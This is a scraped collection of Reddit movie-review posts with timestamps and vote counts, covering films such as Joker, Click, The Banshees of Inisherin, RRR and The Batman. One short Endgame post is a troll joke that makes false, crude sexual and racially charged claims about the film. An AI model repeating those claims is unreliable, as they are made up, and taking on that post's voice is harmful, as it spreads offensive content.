I'll leave off with this because I'm really curious if anyone else has noticed it. As a general rule if I'm interested in a new film I will get onto IMDB and look at the score, and if the score is below a 5.5 I read some reviews and will only watch if I'm really interested. This film currently stands at a 6.3 with over 12,000 reviews, so I didn't look too much into it. Afterwards though I was completely baffled by this and went back to look more in depth, and I have absolutely no clue how that score is possible. Almost every top read and rated review is a 1 or 2 star. If it's some big marketing campaign push it's certainly working, but don't fall for it as this is easily skippable and forgettable content that is not worthy of a 6.3. I think it really could have been something nice and different too which is always the saddest part. As I said though, skip this one. Netflix will put out more content soon and I'm sure they will do their best to push this one by the wayside as the heavily critical coverage becomes clearer.",moviereviews,3024,554,68,0

WHY DID THEY ONLY INTRODUCE THSI LEAD NEAR THE END WHY DID VAUGHN SAY HE WROTE THE POSTERS AND IF HE ACTUALLY DID HELLO?? IS HE THE ZODIAC THEN BC THE GUY SAID THE POSTERS MATCHED THE LETTERS ALSO WHY WAS VAUGHN SO MENACING AND CREEPY TO HIM WHO WAS WALKING UPSTAIRS HOW COME HE NEVER ACTUALLY WENT TO RICKY INSTEAD OF ONLY GOING THRU VAUGHN WE NEVER EVEN SAW WHO THIS RICKY WAS WHY DIDNT HE DELVE DEEPER INTO THIS **WHYYY DID VAUGHN CLAIM TO WRITE THE POSTERS AND THE NOT A LOT OF BASEMENTS IN CALI WHY DID HE JUST LET THAT GO OMG** how did he go through that whole super duper sus experience w vaughn and then hop on back home to just find more evidence on leigh? im not saying i dont think its leigh bc i definitely do BUT VAUGHN WHAT WAS THAT ALL ABOUT?????,moviereviews,2701,550,20,0
1601195283.0,"Enola Holmes, a seemingly interesting idea, poorly executed","Enola Holmes, the younger sister of Mycroft and Sherlock Holmes, and is portrayed by Millie Bobby Brown.  The plot revolves around her missing mother, a tenuous stretch to the suffrage movement, and the patriarchal view of the era that holds down someone as remarkable as Enola.

While Millie has remarkable skills as an actress, and the rest of the cast is able, the movie seems like the vision of woman empowerment that would have been applauded in the 80’s, but here is rife with sexism that overshadows what could have been a great movie.

However, Enola Holmes could easily be turned into a series that, with a little reimagining, could achieve all that it tried for in this movie.

On a 1-10 scale, I’d give it a six.  It’s interesting, the sets were great, as was the casting, but the writing failed.",moviereviews,807,142,20,0

Probably the funniest movie of 2020. 

Time traveling visiting old musicians from the past just had us reminded how these movies were good back then. It just might be somewhat of a reboot with their two daughters taking their place. I don’t really don’t wanna go into spoilers but I thought the movie centered more around  them but with their dads taking the marquee. I didn’t mind at all cause their were splendid.  The make up and special effects were on point as well. It almost had believing that William Sandler was actually death lol jk. 

This was a good feel movie. God knows that we need all of this right now. With a good script and cast this should be a must watch for fans of the past films. It was great seeing Keanu Reeves and Alex Winter back together again.  You can catch it  at most movie theaters or on VOD (Thanks to the current global bastard)

1589278923.0,Schindler's List (1993) -Review,"Schindler's List is not only a pure masterpiece but, for me, it is one of the greatest films ever made in the world.  


The film starts off to reveal a womanizing, Nazi businessman who profited off of slave labor. The Nazi businessman is, of course, Oskar Schindler. Oskar is just like most men. He has a love for good wine, beautiful women, and pursues happiness through the success of his business. But on his journey to a successful business, millions of Jews were being killed during a time which most label as one of the darkest periods of human history. As Oskar made money, innocent people were being murdered. That's when the self-centered, often money hungry Oskar steps in and gives up his goal of having a successful business to save the lives of over 1,000 Jews.  
This film is about redemption and was beautifully photographed in black and white by Janusz Kaminski (cinematographer). At the helm is no one other than Steven Spielberg, who brilliantly called non-pretentious shots and brought back to life a time and period most want to forget, but shouldn't.

My Rating:

7.8/10

Knowing what I was about to watch whilst going into the theatre, well this isn't the best Pixar movie so to speak but what it is is it's a fun, entertaining and at times heartfelt quest movie. The movie follows two brothers Ian Lightfood (Tom Holland) and Barley Lightfood (Chris Pratt) on a quest to complete the enchantment which brings back their father for just one day. It takes place in a fantasy world where mythic creatures are brought into a setting in which there is no need for them to use their specific abilities. Hence, the movie begins and here we are together with these two brothers on a journey with them. 

The animation is obviously incredible and I recently watched the clip from Toy Story where Buzz is chasing Woody whilst he's on the truck and it just shows how much of a technological leap it has been over 2 decades or so and the character models keep getting more and more complex where details can be seen down to the literal fiber of the character's clothing now. So this is something we got to appreciate and this movie is no less than Pixar flexing their artistic skills when it comes to animation where the environment is simply almost realistic and the only thing making it look cartoon-ish would be the colour gradient and the mythical characters. 

Obviously, the voice cast is great which is expected as this is a company whom has delivered some of the best animated movies in this day and age. As for the dialogue well, it is a kids movie so I won't think too much of that aspect in this case. 

Despite these various praises, I felt that the plot was kind of weak where it falls into the stereotypical adventure movie for the first two acts of the movie, and this isn't necessarily a bad thing, I just kind of expected to be hit with a train of emotions whilst watching a Pixar movie but that wasn't really the case here. The problem being that the emotional journey is based around the two brothers trying to revive their father per se but it's half a father and you can't really bond with legs. I mean, honestly speaking, I just did not really care much about their father. But, the movie is definitely saved by the third act where the movie has a shift in direction and it gives the entire movie a different meaning and that was when tears start to roll. 

In the end, this isn't a bad movie, nor is it a fantastic one but I think this movie brings about important values where children should learn especially in the fast world that we live in in which we get what we want without seeing the repercussions or the actual necessity of having it. What I'm trying to say is, this is a good movie and well, go enjoy it because when has Pixar ever let you down. Okay just being real here, I was let down by the Incredibles 2, it wasn't that good as people say it was but that's just my my opinion. ",moviereviews,2857,530,47,0

1575746901.0,"The fundamental problem with the film ""Click,"" with Adam Sandler","The fundamental problem with the film ""Click,"" with Adam Sandler, is at times it's juvenile humor, however, as a Happy Madison's production, that is almost mandatory, and based on that expectation, it is not excessive, when compared to some of Sandler's other films such as ""Happy Gilmnore"" or even ""Waterboy"". When the film sticks to the core plot and leaves out much of the silly low brow humor (with a few exceptions, such as the scene with his wife's crazy friend Janene, or the scene with the Japanese businessmen), it really excels, as the characters are actually interesting and other than the silly humor, the relationships feel real. When the film hits emotionally, it hits hard, and yet at the same time, if you were to take this humor out, it would be a rather mundane, rote, and over sentimental film with just another take on ""A Christmas Carol"" or ""It's a Wonderful Life"", so one could argue the humor actually elevates it. 

&#x200B;

There are a lot of themes in this film that I have yet to see touched upon in other reviews. Yes, it plays in to the whole 'Spend time with family bit,' but on a deeper level then I normally see in films especially in a comedy. It deeply comments on how people have a tendency to follow the example they see, and not what they hear. This is aptly exhibited through his daughters use of vulgarities and his son's poor eating habits; both things they watched their father do. We also see this exhibited through some changes in his son later on when those bad eating habits are changed to good habits through the influence of his health nut stepfather (Sean Astin). 

&#x200B;

A constant recurring theme in this film is struggle of money vs time, which we can see started when he was a child in a flashback camping scene, with a rivalry from childhood (we only see this rival in a flashback, in the present we only see his son and wife). His rival's son is constantly gloating about all the ""cool"" stuff he has, and Sandler's character is very immature, like he has never grown out of that rivalry (cause he has not), and even results to picking on his rival's son, which at times is funny, such as the time his son and the kid our playing catch and he pauses it and moves his glove so the ball hits him in the face. 

&#x200B;

It is truly sad that this man never truly grew up, and what the experience with the remote gives him, is a chance to finally mature in to an adult mentally and emotionally. I would like to say there are not people like this in real life, but I have met them, still stuck in the past, still striving for things in the wrong way, and scared and hurting people in their path out of habit. The only good thing he took with him as hew grew up was his dream of being financially free (which is a great dream to have), but again, he takes the wrong road to achieve it, by constantly trying to bend over backwards and please his boss at the peril of his personal life and family's happiness. 

&#x200B;

It also comments on the pitfalls of a job (something which the American school system programs us to have, rather than say, owning a business and creating a passive cash flow) and how we become controlled by them. His wife at one point even calls him a 'wage slave', which I found to be a very apt description of someone climbing up the corporate ladder. He is constantly chasing a dream that can't happen with a job, it is not possible to have both time and money in a corporate world. 

&#x200B;

Although he is seeking to gain time by losing it in the short term through working hard to move up the corporate ladder. His idea is to get a residual income, the problem is, he is trying to do it through a job, he states to his wife, when he is making millions he will hire a bunch of ppl to do everything for him, but he is using the wrong means to do so, he needs a passive cash flow, not an active one such as job for that, and is neglecting his key relationships in the process, which is the real folly he commits here. 

&#x200B;

He constantly equates corporate success with freedom, and is constantly comparing himself to a childhood rival who 'Has it all.' Instead of just realizing he has it good with his Wife and kids, and actually has a really nice house and life if he'd just see what's in front of him (not that its bad to strive for more, but that plan should be a team effort of the family, not a solo effort, if you are married), but he cannot see it, due to his constant focus on other women, other ppl's money, and why he doesn't like his life, something that most people do, and it is this focus on others and blaming others for our problems that keeps us as humans from ever truly being satisfied. 

&#x200B;

The film doesn't say money is bad or that success is bad, but rather, when that journey neglects your family, it's not a path worth taking. The film aptly shows how marriages suffer when you lose your focus on why (getting more time with your family) you're doing something and the how (the how here being climbing the corporate ladder here) becomes the why instead of the why being the why. 

&#x200B;

Some see the ending as a co-pout, and yes, it is, but by the end of the film the first time I saw it, I saw it as a great relief, as I was nearly hysterically crying the first time I saw it and it allowed me to appreciate what came before without being morbidly depressed, but on repeated viewings, not watching the ending after the sad denouement, might make the film better. I am torn, as to if it it hadn't ended that way, would it have put the focus on his failures instead of how he could change his life around, but if it ended with him lying face up (I suppose it'd be a lot like the ending to the 'Bridge to Terrabithia'), might it have changed the overall message of the film? Given the often light-hearted tone, the ending was congruent with keeping this tone, and the ending was not actually out of character for a film of this nature(13 Going on 30 had a similar ending, but it definitely worked better in the overall scheme of the film), one in which the point was to make you laugh, but hopefully think a little as well. 

&#x200B;

I will say, on repeated viewings, I actually think in a way, since this movie is about choices, and in a ay he forgoes all of his ability to have an active choice until he chooses to die, to to make things right, it makes sense to start over, it is almost like it as a test. So when chooses to never take the remote in the end, I'm not really sure it is a cop-out at all. It may appear that way at first, but he makes things the way they should have been, and this film does its job, when a need a good reminder to put my priorities right, I watch this.",moviereviews,6708,1266,175,0

Saying anymore that that would be a great diservice to anyone who would have the opportunity to watch this (honest) masterpiece of film making in person.
With only Two colors and an old timey askpect ratio this film portays more emotion and power than an every Tyled Perry film looped back to back while tripping on acid ever could.
To use words to describe it.
Which I am.
Its dark. Historical. Terrifying and just utterly captivating at times.

That is just the movie itself. 
In this viewers humble opinion Robert Pattinson and the guy that played the original green goblin have career performances here.
These two are the only people on camera for 2 and a half hours and its glorious. Imagine if William Shakespear in old England wrote, casted and perfomred all of is plays in an island Pshycward and then everyone got drunk and took one too many Viagra. 

If there are any negatives. 
Which I personally cannot find.
It would be the plot. Which unlike a majority of films these days does not explain anything. 
It simple allows the ocean to scream and howl. 
The camera to move graciously. 
The actors to overly masticate and gesticulate long and vaudevillian speechs about the sea.
And most importantly. 
Not to play with fire.

Verdict: Not enough Mermaid sex

1570598631.0,My honest review for Joker 2019,"*This review may contain spoilers:*

So a few days ago I went to the movie theater and seen the well anticipated 2019 film - Joker. The film that everyone has been ranting and raving about. Ever since watching the first trailer release, I couldn't help but feel absolutely intrigued. Now, to be clear, I 'never' go to the movie theaters anymore. I never really have a reason to. I'm not really impressed with cinema nowadays. In fact, I'm downright pessimistic. But hey, that's just my opinion. I prefer watching movies in the comfort of my own home. But for this film, I just had to make an exception and step out of my comfort zone.

Now, first off, let me just say, that my experience in actually going to the movie theater, only further confirmed why I don't go to the movies anymore. There were so many annoying distractions. In fact, I don't think I'll ever return to the theaters ever again. Joker will more than likely be the last film I'll ever see at the theaters. The experience was that bad. I'll spare you the details. But...as in for the overall movie, I can't say the same thing. At least the movie was worth it.

I can honestly say that all the positive hype regarding this film is justified. Joker is without a doubt, in my opinion, one of the best films to come from mainstream cinema in at least the past three years. Finally, something different, unique, unpredictable, and original. One prominent movie reviewer from YouTube, described Joker as being a film that ""really made you think afterwards"". Meaning, the film is thought provoking. I agree.

If you're expecting a superhero themed film, or even your standard super-villain themed film, than you'll be highly disappointed. I would label Joker as being a dark and ominous psychological thriller. The film makes a statement about society, mental health, and attempts to redefine how we, as a society, defines what a villain is, and how a villain comes to be. It's such a nice change of pace, compared to all the relentless superhero films that are being made nowadays.

I won't go too much into the plot. But I can definitely say that this film was much darker than I thought it would be. It was also quite depressing. But I say that in a good way. The film is a fantastic character study. Joaquin Phoenix delivers an amazing unforgettable performance. And not to take away any credit from Heath Ledger's role as the joker. I really enjoyed Heath's performance as well. But I can't even compare the two. They're two entirely different films. Joker isn't even in the same genre as The Dark Knight.

The cinematography was incredible. And yeah, I get it...the average movie-goer might not appreciate that. But as a film fanatic and aspiring filmmaker, I must say, the cinematography was so impressive. The film is shot beautifully, and does a great job at capturing the madness and emotion within the story. Speaking of emotion, that's another element really took me by surprise. The film was sort of an emotional roller coaster. I actually felt bad for Joker / Arthur's character. This film does a great job at humanizing Joker, and allows the audience to see life through his point of view and through his set of circumstances. And that's what makes this movie so special. It is so completely outside of the box, opposed to your average superhero flick. It's a daring story and goes against the grain.

The score was also great. It kind of reminded of the score from Requiem for a Dream. That, combined with the cinematography, was undeniably captivating. The writing and character development was great. The overall cast, aside from Joaquin, was ideal. I think this film will be talked about in the years to come, and may even have an impact on cinema and traditional storytelling, as a whole. I would label Joker as a masterpiece. And believe me, if I thought the film sucked...I would say it. I'm not blindly praising this film. In fact, I had my own set of doubts before heading into the film. Considering how bad my movie theater experience was, I said to myself, ""if this film doesn't get my attention, at least within the first 20 to 30 minutes, than I'm leaving"". But thankfully, that didn't happen. Somehow from the very first opening scene, I just knew this film was going to have potential.

My one and only criticism was the psychological twist, especially at the very end. I could've done without that. I would've much rather preferred seeing Joker stand on top of the cop car, with his face all bloody, and the crowd cheering him on. At least that could've allowed the audience to question for themselves if what was happening was real or not. But oh well. The ending didn't exactly ruin the overall movie for me. I still thoroughly enjoyed it. I could easily overlook that. I'm just saying, if I were the director, I personally would've ended it at that scene.

Some critics claimed that this film had a 'Taxi Driver feel' to it. I didn't really notice. And Taxi Driver is truly one of my all-time favorite films. I mean, if living in New York and struggling with mental problems makes it similar to Taxi Driver, than yeah, maybe. But still, I wouldn't go so far to compare Travis Bickle to Arthur Fleck. Joker is it's own unique standalone story. Though, on a side-note, I did sorta kinda detect some slight American Psycho vibes. But then again, not entirely.

As in for people claiming this film is too violent...I can't help but laugh. Joker is extremely tame in violence compared to other films that I've seen. I mean, yes, there is violence, but nothing too extreme. If you think Joker is violent, try watching Uwe Boll's 2009 film Rampage. Now that's violent. And I must say, even the violence in this film was done in a classy way.

So all in all, I enjoyed it. I can't wait to watch it again. One of the best films I've seen in a seriously long time.",moviereviews,5849,1036,219,0

I just saw endgame, and it was pretty good, but there were a few weird things.

I thought it was strange how the Russo Brothers decided to render Thanos’ erect penis in such vivid detail. The veins were so perfectly done I couldn’t even tell his cock wasn’t real.

Another thing I found weird was when Black Panther broke the fourth wall and gave the audience the n-word pass. I did appreciate it, but it would feel more in place in a Deadpool movie.

1666994800.0,THE BANSHEES OF INISHERIN Really Wails,"by Devin Diazoni (of Film Literate)

Martin McDonagh has, at long last, topped himself cinematically. A celebrated playwright, he arrived on the film scene in 2004 with the Academy Award-winning short film SIX SHOOTER starring Brendan Gleeson as a grieving and weary traveler. After cutting his teeth in theatre for nearly a decade, the distinct voice that McDonagh employs to this day was already established, refined, unwavering. Four years later, he gave the world the wonderful gift of IN BRUGES, a movie about two hitmen (Colin Farrell and, again, Brendan Gleeson) on an unhappy holiday in Belgium. His sophomore effort as a feature filmmaker was SEVEN PSYCHOPATHS, an unfocused yarn led by Colin Farrell as a sort of stand-in for McDonagh himself that every few years seems to demand reappraisal, though it still hasn’t reached the cult status it seemed destined for upon release in 2012. After half a decade off the silver screen, McDonagh returned, roadside signs blazing, with an awards darling in THREE BILLBOARDS OUTSIDE EBBING MISSOURI. Though not quite on its level, what this film had that even In Bruges lacked was an achingly funny sense of things being blown completely out of proportion. This, in many ways, is McDonagh’s comedic bread and butter, scene by scene – an exhaustive verbal assault on every dead horse the characters stumble upon. Sometimes, they’ll even kill a horse just to have something to uselessly beat. But dig a little deeper and there was still an unspeakable tragedy at the heart of THREE BILLBOARDS, which is often the case with stories told by Martin McDonagh.

Until now. His latest film, THE BANSHEES OF INISHERIN, mixes menace with melancholy the melodious way Martin McDonagh always has, but the impetus for everything that transpires in this motion picture is as simple, plain, and petty – though never shy of absolutely human – as can be: Colm (Gleeson, back for thirds with the writer-director) decides one day that he doesn’t want to be friends with Pádraic (Colin Farrell, also back for thirds) anymore. The tragedy, if there is one, is their existence. It’s the 1920s, and the island is a fictional one off the coast of Ireland, beautiful, lush, spare, and as technologically stunted as it is intellectually scant. While a civil war rages across the channel, a different sort of division hits much closer to home for those who live on Inisherin. Colm and Pádraic were once daily staples seated side-by-side at the seaside pub where much of the film’s action takes place, but now the former refuses to sit with – or, whenever possible, even speak to – the latter because he feels his life slipping away with all their aimless chattin’. Or is it good, normal chattin’? Things escalate when Colm threatens to cut off one of his own fingers for each time Pádraic speaks to him from that moment forth. And then their discord starts to really get ugly, with Pádraic’s sister Siobhan and perhaps – jury’s still out – the only resident on Inisherin dimmer than Pádraic, Dominic, getting swept up in the drama. Siobhan is portrayed perfectly by Kerry Condon, with pain and spirit and warmth, while Dominic places Barry Keoghan back in familiar territory as awkward and unexceptional, but the young actor, once again, finds notes and nuance in the character, further cementing him as possibly the best of his generation. These two key supporting players are both more than up to the task of working opposite Farrell and Gleeson who themselves with performances that are hard to call anything less than the best of their impressive careers.

Full of side-splittingly funny dialogue and debatably funnier silences, THE BANSHEES OF INISHERIN might also rank among the saddest movies you’ll ever see, thanks in no small part to the quietly devastating score composed by Carter Burwell. This is a film about family, friendship, and love. This is a film about anger, despair, and hate. This is a film about war. It’s occasionally hard to look at – despite the costumes designed by Eimer Ni Mhaoldomhnaigh, the sets decorated by Michael Standish, and the shots lit by Ben Davis – but even harder to look away from. With spatters of blood and sprinkles of Irish folklore, this truly remarkable cinematic feat could only come out of one person’s head: Martin McDonagh, to whom we owe our thanks for helping us find a way to, through the tears, laugh at how hard it can be to be human.",moviereviews,4417,749,90,0

1664922181.0,Blonde (2022) - Review,"While I appreciate the career best performance from Ana de Armas in the newest controversial release, Blonde (2022), I personally still found the movie too disturbing and lengthy for its own good.

""Sure to be 2022's most divisive film yet, Blonde boldly ventures into the realm of discomfort to create a film that is certainly hard to stomach. With the film harshly bordering between being eye-opening and overwhelming, I can definitely understand the split criticism that has been shared by movie critics. Blonde is a fictionalized biographical drama focusing on the short life of Norma Jeane Mortenson, also known as the iconic actress, Marilyn Monroe. Directed by Andrew Dominik and starring Ana de Armas in the titular role, the film is based on the novel of the same name by Joyce Carol Oates. As one of my most anticipated watches in September, my excitement towards finally watching the film quickly turned into shock as it did for many. If you've yet to see the film, please note you should prepare yourself to either very passionately hate it or love it (you definitely won't come out of it feeling neutral)...""

The opening scene with the prequel little Sanderson sisters was the best part of the film, those little dudets killed it.

But then the movie goes into woke mode, and there are several refrences and moments of Disney reminding you it's 2022 lol.

The returning cast members especially Bette Midler were great, but the two/three teen leads were imo awful. It felt like they were all the same character to me none of them stood out.

It felt like a Netflix movie with it's ending and happily ever after stuff.

Predictable, boring blatant cash grab and revive of a beloved original.

1663956574.0,American Beauty- Review,"American Beauty starts off by going through the day-to-day motions of the comical, mid-crisis, main-character Lester endures; a shady corporate job he hates, and stuck-up wife he hates, a daughter who hates him, and a life that seems to fit the American dream to the public, but there’s a lot more going on behind the curtains. We are revealed in the first minutes of the movie that Lester will die, predictably from murder. 
At first glance the movie appears predictable and unoriginal, but as the plot thickens more twists arise from beneath the surface. Lester falling in love with his daughter Jane’s best friend Angela made me wonder if he was actually a pedophile or just bored (spoiler: he was bored). 
Lester starts working out to impress Angela, smoking weed, quits his job, and finally sticks up to his wife Carolyn, leading them to separate. At this point in the movie it was difficult to tell whether he was truly finding himself or if he was reverting back to his “teenager” ways so he could have sex with Angela. He certainly had burned all his bridges by the third half of the movie, leaving me to wonder who was going to kill him.
The biggest twist at the end, being that Rickey’s military dad Colonel Fitts is a closeted homosexual was certainly surprising and changed the context of the entire movie. I was still left wondering why Fitts decided to kill Lester after trying to hook up with him, but I guess he probably would rather go to jail for murder than be outed as gay. 
The visuals in the movie focused on Lester’s reoccurring fantasies about Angela, which displayed the beautiful roses that Carolyn was obsessed with gardening. I wondered if Lester saw Angela as a teenage version of Carolyn, and evidence points to that when Lester tells Carolyn he wishes she could revert back to the “old Carolyn.” 
Overall I’d give this movie a 4.5 out of 5, it certainly didn’t disappoint and I’d recommend it to any Romance-Drama lover.",moviereviews,1951,342,33,0

The whole point of the movie was to have 6  expose them but in the end they get away with it unscathed? No thanks. 

The only major thing to come out of the plot is the crazy dude is now dead. But like that really does not have a huge impact.

1653587273.0,Top Gun: Maverick (2022) Review,"Since I was a child, I have watched many movies acted by Tom Cruise. It's hard to imagine that at 60-years-old, his acting skill is still shinny like a star among the top actors worldwide. Several scenes are even a perfect match with his winkles around the eyes. Tom has delivered so many memorable movies, such as my favorite ""The Edge of Tomorrow"" and ""Mission: Impossible""... Just as impressive as the role in The film Top Gun - Maverick,  Maverick, A brilliant and honored navy captain who made so many achievements in his 30-years career.

The movie's most beautiful part is Maverick's attitude toward his work. He spent 30 years as a pilot, and the most matter is he loves being a pilot and enjoys the feeling of crossing through the sky. His commander even sarcastic Maverick by saying he is a 30-years old Captain without promotion for a long time. But Maverick just treated it like a joke. The way he fixes the jet is like taking care of a baby, and he touches the jet body before missions start. ""Don't give me that face,"" the jet engineer always makes jokes to him. ""That's the face I only got,"" Maverick replies gently. That's how the mindset should be; life could be as dramatic as it is, and it won't bother how we accomplish our tasks and be proud of what we do.

Excellent people share a common trait: A remarkable resilience to hardship and collision. Many glowing impressive scenes show the beaming smiley faces. Mav had a wonderful sailing trip with His girlfriend Penny even though he just got his new job as a pilot teacher he dislikes. However, the way he smiles is warm-hearted and blows away the troubles. After a fight between Rooster and Hangman,  those two rivals still have a great time playing the rugby ball on the beach. Before the day that Maverick goes for the miracle mission, he wears a handsome white navy commander suit, comes to the bar, and meets Penny. They sit alongside the beach and enjoy the beautiful night scene. I believe those scenes want to deliver a message: No matter how hard the tomorrow is,  the current moment is the most precious thing to care about; that's why we call it the present.

There is a good saying in Chinese: ""There are 80% or 90% plus possibility that your life doesn't work like what you wished for"". Although I have to say there are too many miracles happening in this movie, it sounds like a little bit of ""utopia."" But that's how the film works, encouraging and inspiring people to think positively and act effectively. Be true to what you worked on, and forget about subjective factors. At the end of the day, everyone has their jet to drive,  and when the plane is taking off, the pilot controls the direction. It is not about the plane, and it is about the pilot. Don't overthink, and have a nice fly.",moviereviews,2778,500,83,0
1653515656.0,RRR (2022) Review,"A few weeks ago, I wrote a piece about my personal journey with Bollywood (l[ One of my points was that it took me a long time to understand that Western cinema isn’t necessarily a blueprint for good filmmaking. It’s easy to joke about Indian cinema being cringe, with often silly action scenes, musical sequences, and over-the-top acting, but I’ve only recently grown to appreciate that as valuable elements of a unique style of filmmaking.

Nowhere is this more true than in RRR (2022), a Telugu movie directed by S. S. Rajamouli (who also directed the exceptional *Baahubali* movies). The film depicts two legendary revolutionaries and their fight against the British for their country in the 1920s. The two, who have extremely different backgrounds, form a tremendous bond, but what happens when their respective missions put them at odds with one another?

This movie is every trope you could imagine in Indian cinema, but executed extraordinarily well. It is big, exhilarating, and electrifying beyond comparison. I’ve spent some time now trying to discern what distinguishes RRR from some of the more run-of-the-mill, tired action movies coming out of India. I believe it boils down to the heart of the story. RRR does not sacrifice storytelling at the expense of action setpieces. While the action is certainly breathtaking, it’s all enabled by incredible character and a profound story of friendship and patriotism. This makes the movie fly by, despite its 3 hour runtime (not a second of which is wasted). Additionally, its stunt-work, practical effects, and action choreography are top-notch.

RRR also got me thinking about how the idea of spectacle has changed in Hollywood. Recently, it feels like American film spectacle is cheering at a celebrity cameo, a crossover between characters, a screenshot-able epic ‘moment’ made for Internet virality. But moments alone are not truly epic. It’s the entire experience that sparks real emotion. RRR does this all in one movie, and it never takes its foot off the pedal.

Definitely check this movie out. Regrettably, the Netflix version is dubbed in Hindi over the original Telugu. Luckily, the original Telugu version will be showing in theaters across the US on June 1st! If you can catch it then, you certainly should -- this movie is made for the theater experience.",moviereviews,2328,381,49,0
1650645296.0,"The Batman: Nope, didn't like it."," Finished watching “The Batman” on HBO Max tonight. ”Finished” because I had started it yesterday and just could not get through all three hours in one sitting. Of all the movies with compelling storylines, engaging character development, and captivating dialogue, this was definitely not one of them. It was the poseur of all of those things, shoving a gritty cinema verité and semi-realistic action scenes in the viewer’s face as sophomoric hubris, a film student who finally discovered sidelighting and shadow and cannot wait to abuse the tropes of manufactured emotional darkness.

The film itself has been wildly popular with most of the public, proof to me that the general audiences are easily fooled by moody actors into thinking they have witnessed storytelling or content worth mulling over. To be fair, the concept itself was clever; take the fantastic world of unrealistic superheroes and supervillains and bring them down to Earth, much as 2019’s “The Joker” had done. My comment to Warner Bros and DC Comics: please stop doing that. There are plenty of realistic movies to watch. I want my superheroes to be super, not secular. In fact, there’s nothing *less* realistic than real people doing parkour with pointy ear cowls; it’s the excess of a proper super character that makes them more believable. Pattison’s single brooding expression does little to unfold a character of interest and I was even hoping he would start sparkling at some point just to lessen my disgust.

All that aside, what truly irks me about this latest iteration is the “done dirty” that happened to Zack Snyder and the butchering of “Justice League” at the hands of Joss Whedon (whom I normally think the world of and am confused by the hamfisted editing he did). Ben Affleck was the most interesting and even relatable Batman of all, and the way the character had developed through “Batman vs Superman” was finally doing the world-building that DC had sorely lacked in comparison to the MCU. Snyder’s “Justice League” had spread the sort of tableau of interconnected potential stories that it left me wanting so much more… and all of that discarded when the disconnected fools at Warner Bros decided to drop a big deuce of “another direction”. It’s beyond frustrating, it’s a tragedy.

Is “The Batman” watchable? Barely so. Is it re-watchable? Only if you pay me. That was three hours of my time that could have been spent re-watching “Thor: Ragnarok” or even surfing YouTube for talking husky videos instead.",moviereviews,2499,416,37,0
1650462052.0,The Big Lebowski (1998): 10-Category Review,"The Big Lebowski is a wolf in sheep's clothing. Seemingly pointless, it combines several methods into a sly blend. It's a comedy, but also exhibits western and noir attributes as The Dude navigates his entanglements. Meanwhile, the film sneaks in relevant social and political classism critiques. Plus, this is all unified by spiritual messages of surrender. These ingredients could've been messy, but the Coens find balance, subtly suggesting themes with potent details. Furthermore, the cast wholly embodies their eccentric characters. Thus, The Big Lebowski is a thoughtful journey that, fittingly, can be enjoyed without noticing its undertones.

Technically, The Big Lebowski has cunning style. The precise direction captures an outlandish atmosphere and nonchalant tone. It rarely feels overtly artistic, yet there's a lurking sense of deeper meaning. The visuals provide hypnotic transitions, elaborate dreams, and dramatic montages. These moments are further supported by careful editing, which also keeps the runtime tight and punctuates comedy. The sound is symbolically abstract, the production is iconic, and the effects heighten the surrealism. Lastly, the music fuses humor with thematic weight. Overall, The Big Lebowski is a joyful and deceptively substantial experience, definitively earning its modern classic status.

1650114225.0,Fantastic Beasts and Where to Find Them (2016): 10-Category Review,"Fantastic Beasts and Where to Find Them is messy, yet decent. Although it's weakened by distracting storylines, the core premise of capturing beasts is enjoyable. Fittingly, Redmayne is more comfortable around animals than humans, which is heartfelt and vulnerable. Plus, Fogler and Sudol are lovable outsiders of their own. Unfortunately, whenever Fantastic Beasts visits plotlines outside these main protagonists, the film suffers. Grindelwald, politics, and Ezra Miller just aren't as fun. Also, those ancillary threads don't gel with the small adventures of creature hunting. Clearly, Fantastic Beasts had duel intentions, and because of that, the film is diluted. 

Meanwhile, the technicals of Fantastic Beasts are solid. Just the editing is questionable due to its stumbling momentum. Besides that, however, the craft is proficient. The cinematography uses engaging movement, the sound is complex, and the effects are comprehensive. Furthermore, the music incorporates the iconic Potterverse tune and some era-appropriate melodies. Yet, it's the production design that stands out for cohesively blending fantasy with period piece. Both elements synergize to create immersion. Overall, Fantastic Beasts is a fun movie that's held back by superfluous narratives. It's satisfactory, but would've been better as its own thing.

1649424500.0,Ambulance (2022): 10-Category Review,"Ambulance is clumsy yet entertaining. Although he's reaching for more, Michael Bay is blunt. First, the characters are cliched. Abdul-Mateen is a veteran father with financial struggles, Gyllenhaal is a psycho with a soft spot, and Gonzalez is a jaded paramedic. Development is nice, but each role is completely generic (as is their dialogue). Plus, the entire narrative is contrived. Each procedural plot point is really an excuse for explosions. Furthermore, Ambulance is occasionally tiring because too many threads are woven in. Streamlining the ancillary characters would've helped. Still, the lead actors elevate the material, even if they're sometimes repetitive.

Meanwhile, Ambulance is technically engaged. In fact, it's moderately overdone. Fortunately, the effects are elaborate and practical. Also, the complex sound gets abstract, music is utilized for refreshing levity, and the core cast is excellent. However, the visuals are equally cinematic and chaotic. The camerawork is active, but drone shots and shaky cams are often disorienting. This is exacerbated by turbulent editing. Action sequences are energized, but also unclear. Additionally, the runtime is simply overindulgent. Ambulance looses steam because it's inefficient. Ultimately, Ambulance is a decent attempt that viewers will want to like, but it's also fairly messy.

1648474549.0,Flee (2021): 10-Category Review,"Flee is powerful. It's deeply heartbreaking because it addresses hard truths. Flee is the story of Amin, a refugee who escapes war-torn Afghanistan. His family immigrates to Russia, where they're still oppressed. From there, they attempt to reach salvation in Sweden. Along the way, Amin's family is abused and separated. His story addresses corruption, trafficking, and the lasting effects of trauma, yet remains grounded in personal relationships. Also, Amin's interviews are extremely vulnerable. He clearly hasn't opened up this much before, and his honest perspective is a genuine gift. Therefore, Flee is incredibly moving and truly illuminating.

Meanwhile, Flee is creatively delivered. Choosing to depict Amin's stories through animation, Flee feels timeless and universal. Animation is frequently a lighthearted medium, so it juxtaposes the horrors of its content. Meanwhile, this frees up the cinematography and editing for artistic expression. The sound has a deeper impact because it's the only literal connection to Amin. Plus, the style of the drawings changes depending on the clarity of the memory. It's this intentional look and expression of the animation that sets Flee apart and serves its messages. Ultimately, Flee isn't for the faint of heart, but will enlighten those who view it.

